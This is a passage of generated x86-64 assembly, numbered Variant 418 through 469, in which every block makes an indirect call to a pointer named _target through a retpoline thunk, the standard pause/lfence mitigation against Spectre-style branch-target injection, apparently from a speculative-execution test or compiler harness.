	jmp	.Lgg_retpol_cap_000417
.Lgg_retpol_setup_000417:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000417:
	jmp	.Lvictim_win0_continue
## Variant 418
.Lvictim_win0_var418:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000418
	jmp	.Lgg_retpol_after_000418
.Lgg_retpol_thunk_000418:
	callq	.Lgg_retpol_setup_000418
.Lgg_retpol_cap_000418:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000418
.Lgg_retpol_setup_000418:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000418:
	jmp	.Lvictim_win0_continue
## Variant 419
.Lvictim_win0_var419:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000419
	jmp	.Lgg_retpol_after_000419
.Lgg_retpol_thunk_000419:
	callq	.Lgg_retpol_setup_000419
.Lgg_retpol_cap_000419:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000419
.Lgg_retpol_setup_000419:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000419:
	jmp	.Lvictim_win0_continue
## Variant 420
.Lvictim_win0_var420:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000420
	jmp	.Lgg_retpol_after_000420
.Lgg_retpol_thunk_000420:
	callq	.Lgg_retpol_setup_000420
.Lgg_retpol_cap_000420:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000420
.Lgg_retpol_setup_000420:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000420:
	jmp	.Lvictim_win0_continue
## Variant 421
.Lvictim_win0_var421:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000421
	jmp	.Lgg_retpol_after_000421
.Lgg_retpol_thunk_000421:
	callq	.Lgg_retpol_setup_000421
.Lgg_retpol_cap_000421:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000421
.Lgg_retpol_setup_000421:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000421:
	jmp	.Lvictim_win0_continue
## Variant 422
.Lvictim_win0_var422:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000422
	jmp	.Lgg_retpol_after_000422
.Lgg_retpol_thunk_000422:
	callq	.Lgg_retpol_setup_000422
.Lgg_retpol_cap_000422:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000422
.Lgg_retpol_setup_000422:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000422:
	jmp	.Lvictim_win0_continue
## Variant 423
.Lvictim_win0_var423:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000423
	jmp	.Lgg_retpol_after_000423
.Lgg_retpol_thunk_000423:
	callq	.Lgg_retpol_setup_000423
.Lgg_retpol_cap_000423:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000423
.Lgg_retpol_setup_000423:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000423:
	jmp	.Lvictim_win0_continue
## Variant 424
.Lvictim_win0_var424:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000424
	jmp	.Lgg_retpol_after_000424
.Lgg_retpol_thunk_000424:
	callq	.Lgg_retpol_setup_000424
.Lgg_retpol_cap_000424:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000424
.Lgg_retpol_setup_000424:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000424:
	jmp	.Lvictim_win0_continue
## Variant 425
.Lvictim_win0_var425:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000425
	jmp	.Lgg_retpol_after_000425
.Lgg_retpol_thunk_000425:
	callq	.Lgg_retpol_setup_000425
.Lgg_retpol_cap_000425:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000425
.Lgg_retpol_setup_000425:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000425:
	jmp	.Lvictim_win0_continue
## Variant 426
.Lvictim_win0_var426:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000426
	jmp	.Lgg_retpol_after_000426
.Lgg_retpol_thunk_000426:
	callq	.Lgg_retpol_setup_000426
.Lgg_retpol_cap_000426:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000426
.Lgg_retpol_setup_000426:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000426:
	jmp	.Lvictim_win0_continue
## Variant 427
.Lvictim_win0_var427:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000427
	jmp	.Lgg_retpol_after_000427
.Lgg_retpol_thunk_000427:
	callq	.Lgg_retpol_setup_000427
.Lgg_retpol_cap_000427:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000427
.Lgg_retpol_setup_000427:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000427:
	jmp	.Lvictim_win0_continue
## Variant 428
.Lvictim_win0_var428:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000428
	jmp	.Lgg_retpol_after_000428
.Lgg_retpol_thunk_000428:
	callq	.Lgg_retpol_setup_000428
.Lgg_retpol_cap_000428:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000428
.Lgg_retpol_setup_000428:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000428:
	jmp	.Lvictim_win0_continue
## Variant 429
.Lvictim_win0_var429:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000429
	jmp	.Lgg_retpol_after_000429
.Lgg_retpol_thunk_000429:
	callq	.Lgg_retpol_setup_000429
.Lgg_retpol_cap_000429:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000429
.Lgg_retpol_setup_000429:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000429:
	jmp	.Lvictim_win0_continue
## Variant 430
.Lvictim_win0_var430:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000430
	jmp	.Lgg_retpol_after_000430
.Lgg_retpol_thunk_000430:
	callq	.Lgg_retpol_setup_000430
.Lgg_retpol_cap_000430:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000430
.Lgg_retpol_setup_000430:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000430:
	jmp	.Lvictim_win0_continue
## Variant 431
.Lvictim_win0_var431:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000431
	jmp	.Lgg_retpol_after_000431
.Lgg_retpol_thunk_000431:
	callq	.Lgg_retpol_setup_000431
.Lgg_retpol_cap_000431:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000431
.Lgg_retpol_setup_000431:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000431:
	jmp	.Lvictim_win0_continue
## Variant 432
.Lvictim_win0_var432:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000432
	jmp	.Lgg_retpol_after_000432
.Lgg_retpol_thunk_000432:
	callq	.Lgg_retpol_setup_000432
.Lgg_retpol_cap_000432:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000432
.Lgg_retpol_setup_000432:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000432:
	jmp	.Lvictim_win0_continue
## Variant 433
.Lvictim_win0_var433:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000433
	jmp	.Lgg_retpol_after_000433
.Lgg_retpol_thunk_000433:
	callq	.Lgg_retpol_setup_000433
.Lgg_retpol_cap_000433:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000433
.Lgg_retpol_setup_000433:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000433:
	jmp	.Lvictim_win0_continue
## Variant 434
.Lvictim_win0_var434:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000434
	jmp	.Lgg_retpol_after_000434
.Lgg_retpol_thunk_000434:
	callq	.Lgg_retpol_setup_000434
.Lgg_retpol_cap_000434:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000434
.Lgg_retpol_setup_000434:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000434:
	jmp	.Lvictim_win0_continue
## Variant 435
.Lvictim_win0_var435:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000435
	jmp	.Lgg_retpol_after_000435
.Lgg_retpol_thunk_000435:
	callq	.Lgg_retpol_setup_000435
.Lgg_retpol_cap_000435:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000435
.Lgg_retpol_setup_000435:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000435:
	jmp	.Lvictim_win0_continue
## Variant 436
.Lvictim_win0_var436:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000436
	jmp	.Lgg_retpol_after_000436
.Lgg_retpol_thunk_000436:
	callq	.Lgg_retpol_setup_000436
.Lgg_retpol_cap_000436:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000436
.Lgg_retpol_setup_000436:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000436:
	jmp	.Lvictim_win0_continue
## Variant 437
.Lvictim_win0_var437:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000437
	jmp	.Lgg_retpol_after_000437
.Lgg_retpol_thunk_000437:
	callq	.Lgg_retpol_setup_000437
.Lgg_retpol_cap_000437:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000437
.Lgg_retpol_setup_000437:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000437:
	jmp	.Lvictim_win0_continue
## Variant 438
.Lvictim_win0_var438:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000438
	jmp	.Lgg_retpol_after_000438
.Lgg_retpol_thunk_000438:
	callq	.Lgg_retpol_setup_000438
.Lgg_retpol_cap_000438:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000438
.Lgg_retpol_setup_000438:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000438:
	jmp	.Lvictim_win0_continue
## Variant 439
.Lvictim_win0_var439:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000439
	jmp	.Lgg_retpol_after_000439
.Lgg_retpol_thunk_000439:
	callq	.Lgg_retpol_setup_000439
.Lgg_retpol_cap_000439:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000439
.Lgg_retpol_setup_000439:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000439:
	jmp	.Lvictim_win0_continue
## Variant 440
.Lvictim_win0_var440:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000440
	jmp	.Lgg_retpol_after_000440
.Lgg_retpol_thunk_000440:
	callq	.Lgg_retpol_setup_000440
.Lgg_retpol_cap_000440:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000440
.Lgg_retpol_setup_000440:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000440:
	jmp	.Lvictim_win0_continue
## Variant 441
.Lvictim_win0_var441:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000441
	jmp	.Lgg_retpol_after_000441
.Lgg_retpol_thunk_000441:
	callq	.Lgg_retpol_setup_000441
.Lgg_retpol_cap_000441:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000441
.Lgg_retpol_setup_000441:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000441:
	jmp	.Lvictim_win0_continue
## Variant 442
.Lvictim_win0_var442:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000442
	jmp	.Lgg_retpol_after_000442
.Lgg_retpol_thunk_000442:
	callq	.Lgg_retpol_setup_000442
.Lgg_retpol_cap_000442:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000442
.Lgg_retpol_setup_000442:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000442:
	jmp	.Lvictim_win0_continue
## Variant 443
.Lvictim_win0_var443:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000443
	jmp	.Lgg_retpol_after_000443
.Lgg_retpol_thunk_000443:
	callq	.Lgg_retpol_setup_000443
.Lgg_retpol_cap_000443:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000443
.Lgg_retpol_setup_000443:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000443:
	jmp	.Lvictim_win0_continue
## Variant 444
.Lvictim_win0_var444:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000444
	jmp	.Lgg_retpol_after_000444
.Lgg_retpol_thunk_000444:
	callq	.Lgg_retpol_setup_000444
.Lgg_retpol_cap_000444:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000444
.Lgg_retpol_setup_000444:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000444:
	jmp	.Lvictim_win0_continue
## Variant 445
.Lvictim_win0_var445:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000445
	jmp	.Lgg_retpol_after_000445
.Lgg_retpol_thunk_000445:
	callq	.Lgg_retpol_setup_000445
.Lgg_retpol_cap_000445:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000445
.Lgg_retpol_setup_000445:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000445:
	jmp	.Lvictim_win0_continue
## Variant 446
.Lvictim_win0_var446:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000446
	jmp	.Lgg_retpol_after_000446
.Lgg_retpol_thunk_000446:
	callq	.Lgg_retpol_setup_000446
.Lgg_retpol_cap_000446:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000446
.Lgg_retpol_setup_000446:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000446:
	jmp	.Lvictim_win0_continue
## Variant 447
.Lvictim_win0_var447:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000447
	jmp	.Lgg_retpol_after_000447
.Lgg_retpol_thunk_000447:
	callq	.Lgg_retpol_setup_000447
.Lgg_retpol_cap_000447:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000447
.Lgg_retpol_setup_000447:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000447:
	jmp	.Lvictim_win0_continue
## Variant 448
.Lvictim_win0_var448:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000448
	jmp	.Lgg_retpol_after_000448
.Lgg_retpol_thunk_000448:
	callq	.Lgg_retpol_setup_000448
.Lgg_retpol_cap_000448:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000448
.Lgg_retpol_setup_000448:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000448:
	jmp	.Lvictim_win0_continue
## Variant 449
.Lvictim_win0_var449:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000449
	jmp	.Lgg_retpol_after_000449
.Lgg_retpol_thunk_000449:
	callq	.Lgg_retpol_setup_000449
.Lgg_retpol_cap_000449:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000449
.Lgg_retpol_setup_000449:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000449:
	jmp	.Lvictim_win0_continue
## Variant 450
.Lvictim_win0_var450:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000450
	jmp	.Lgg_retpol_after_000450
.Lgg_retpol_thunk_000450:
	callq	.Lgg_retpol_setup_000450
.Lgg_retpol_cap_000450:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000450
.Lgg_retpol_setup_000450:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000450:
	jmp	.Lvictim_win0_continue
## Variant 451
.Lvictim_win0_var451:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000451
	jmp	.Lgg_retpol_after_000451
.Lgg_retpol_thunk_000451:
	callq	.Lgg_retpol_setup_000451
.Lgg_retpol_cap_000451:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000451
.Lgg_retpol_setup_000451:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000451:
	jmp	.Lvictim_win0_continue
## Variant 452
.Lvictim_win0_var452:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000452
	jmp	.Lgg_retpol_after_000452
.Lgg_retpol_thunk_000452:
	callq	.Lgg_retpol_setup_000452
.Lgg_retpol_cap_000452:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000452
.Lgg_retpol_setup_000452:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000452:
	jmp	.Lvictim_win0_continue
## Variant 453
.Lvictim_win0_var453:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000453
	jmp	.Lgg_retpol_after_000453
.Lgg_retpol_thunk_000453:
	callq	.Lgg_retpol_setup_000453
.Lgg_retpol_cap_000453:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000453
.Lgg_retpol_setup_000453:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000453:
	jmp	.Lvictim_win0_continue
## Variant 454
.Lvictim_win0_var454:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000454
	jmp	.Lgg_retpol_after_000454
.Lgg_retpol_thunk_000454:
	callq	.Lgg_retpol_setup_000454
.Lgg_retpol_cap_000454:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000454
.Lgg_retpol_setup_000454:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000454:
	jmp	.Lvictim_win0_continue
## Variant 455
.Lvictim_win0_var455:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000455
	jmp	.Lgg_retpol_after_000455
.Lgg_retpol_thunk_000455:
	callq	.Lgg_retpol_setup_000455
.Lgg_retpol_cap_000455:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000455
.Lgg_retpol_setup_000455:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000455:
	jmp	.Lvictim_win0_continue
## Variant 456
.Lvictim_win0_var456:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000456
	jmp	.Lgg_retpol_after_000456
.Lgg_retpol_thunk_000456:
	callq	.Lgg_retpol_setup_000456
.Lgg_retpol_cap_000456:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000456
.Lgg_retpol_setup_000456:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000456:
	jmp	.Lvictim_win0_continue
## Variant 457
.Lvictim_win0_var457:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000457
	jmp	.Lgg_retpol_after_000457
.Lgg_retpol_thunk_000457:
	callq	.Lgg_retpol_setup_000457
.Lgg_retpol_cap_000457:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000457
.Lgg_retpol_setup_000457:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000457:
	jmp	.Lvictim_win0_continue
## Variant 458
.Lvictim_win0_var458:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000458
	jmp	.Lgg_retpol_after_000458
.Lgg_retpol_thunk_000458:
	callq	.Lgg_retpol_setup_000458
.Lgg_retpol_cap_000458:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000458
.Lgg_retpol_setup_000458:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000458:
	jmp	.Lvictim_win0_continue
## Variant 459
.Lvictim_win0_var459:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000459
	jmp	.Lgg_retpol_after_000459
.Lgg_retpol_thunk_000459:
	callq	.Lgg_retpol_setup_000459
.Lgg_retpol_cap_000459:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000459
.Lgg_retpol_setup_000459:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000459:
	jmp	.Lvictim_win0_continue
## Variant 460
.Lvictim_win0_var460:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000460
	jmp	.Lgg_retpol_after_000460
.Lgg_retpol_thunk_000460:
	callq	.Lgg_retpol_setup_000460
.Lgg_retpol_cap_000460:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000460
.Lgg_retpol_setup_000460:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000460:
	jmp	.Lvictim_win0_continue
## Variant 461
.Lvictim_win0_var461:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000461
	jmp	.Lgg_retpol_after_000461
.Lgg_retpol_thunk_000461:
	callq	.Lgg_retpol_setup_000461
.Lgg_retpol_cap_000461:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000461
.Lgg_retpol_setup_000461:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000461:
	jmp	.Lvictim_win0_continue
## Variant 462
.Lvictim_win0_var462:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000462
	jmp	.Lgg_retpol_after_000462
.Lgg_retpol_thunk_000462:
	callq	.Lgg_retpol_setup_000462
.Lgg_retpol_cap_000462:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000462
.Lgg_retpol_setup_000462:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000462:
	jmp	.Lvictim_win0_continue
## Variant 463
.Lvictim_win0_var463:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000463
	jmp	.Lgg_retpol_after_000463
.Lgg_retpol_thunk_000463:
	callq	.Lgg_retpol_setup_000463
.Lgg_retpol_cap_000463:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000463
.Lgg_retpol_setup_000463:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000463:
	jmp	.Lvictim_win0_continue
## Variant 464
.Lvictim_win0_var464:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000464
	jmp	.Lgg_retpol_after_000464
.Lgg_retpol_thunk_000464:
	callq	.Lgg_retpol_setup_000464
.Lgg_retpol_cap_000464:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000464
.Lgg_retpol_setup_000464:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000464:
	jmp	.Lvictim_win0_continue
## Variant 465
.Lvictim_win0_var465:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000465
	jmp	.Lgg_retpol_after_000465
.Lgg_retpol_thunk_000465:
	callq	.Lgg_retpol_setup_000465
.Lgg_retpol_cap_000465:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000465
.Lgg_retpol_setup_000465:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000465:
	jmp	.Lvictim_win0_continue
## Variant 466
.Lvictim_win0_var466:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000466
	jmp	.Lgg_retpol_after_000466
.Lgg_retpol_thunk_000466:
	callq	.Lgg_retpol_setup_000466
.Lgg_retpol_cap_000466:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000466
.Lgg_retpol_setup_000466:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000466:
	jmp	.Lvictim_win0_continue
## Variant 467
.Lvictim_win0_var467:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000467
	jmp	.Lgg_retpol_after_000467
.Lgg_retpol_thunk_000467:
	callq	.Lgg_retpol_setup_000467
.Lgg_retpol_cap_000467:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000467
.Lgg_retpol_setup_000467:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000467:
	jmp	.Lvictim_win0_continue
## Variant 468
.Lvictim_win0_var468:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000468
	jmp	.Lgg_retpol_after_000468
.Lgg_retpol_thunk_000468:
	callq	.Lgg_retpol_setup_000468
.Lgg_retpol_cap_000468:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000468
.Lgg_retpol_setup_000468:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000468:
	jmp	.Lvictim_win0_continue
## Variant 469
.Lvictim_win0_var469:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000469
	jmp	.Lgg_retpol_after_000469
.Lgg_retpol_thunk_000469:
	callq	.Lgg_retpol_setup_000469
.Lgg_retpol_cap_000469:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000469
.Lgg_retpol_setup_000469:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000469:
